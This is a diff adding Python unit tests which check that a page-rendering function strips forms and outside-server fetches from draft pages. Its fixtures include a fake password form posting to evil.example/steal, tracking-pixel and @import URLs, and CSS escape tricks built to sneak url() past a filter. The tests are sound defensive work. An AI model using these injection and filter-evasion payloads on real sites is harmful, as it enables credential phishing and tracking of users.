@@ -136,6 +136,42 @@ class TestFACPage(BaseAssistantTest):
             self.assertNotIn(unsafe, served)
         self.assertIn('class="mk-card"', served)
 
+    def test_a_draft_cannot_draw_a_form_or_reach_an_outside_server(self):
+        # A draft could otherwise draw a fake password prompt that posts out, or ping a server.
+        html = (
+            '<div class="mk-card" style="background-image:url(https://evil.example/p.gif);color:red">'
+            '<form action="https://evil.example/steal"><input type="password" name="p">'
+            "<select><option>a</option></select><textarea></textarea><button>Sign in</button>"
+            "</form></div>"
+        )
+        style = (
+            '@import url("https://evil.example/a.css");\n@import "https://evil.example/b.css";\n'
+            ".mk-card { color: red; background: URL( 'https://evil.example/c.gif' ); }\n"
+            '.x { background-image: image-set("https://evil.example/d.png" 1x); }\n'
+            ".y { background: \\75 rl(https://evil.example/e.gif); }\n"
+            ".z { background: \\5c 75 rl(https://evil.example/f.gif); }"
+        )
+        slug = self._make_page(published=0, html=html, style=style)
+        self._act_as("fac-page-draft-form", roles=("System Manager",))
+
+        page = get_page(slug)
+
+        for tag in ("<form", "<input", "<button", "<select", "<textarea"):
+            self.assertNotIn(tag, page["html"])
+        self.assertNotIn("evil.example", page["html"])
+        # An escaped backslash leaves "75 rl(", which no browser reads as url().
+        for fetch in ("@import", "url(", "image-set", "\\"):
+            self.assertNotIn(fetch, page["style"].lower())
+        self.assertIn(".mk-card { color: red;", page["style"])
+        self.assertIn('class="mk-card"', page["html"])
+
+    def test_a_published_page_style_is_served_unchanged(self):
+        style = '@import url("https://fonts.example/a.css");\n.mk-card { background: url(/files/x.png); }'
+        slug = self._make_page(published=1, style=style)
+        self._act_as("fac-page-published-style", roles=("System Manager",))
+
+        self.assertEqual(get_page(slug)["style"], style)
+
     def test_a_published_page_html_is_served_unchanged(self):
         html = '<div class="mk-card" onclick="go()"><img src="x" onerror="track()"></div>'
         slug = self._make_page(published=1, html=html)
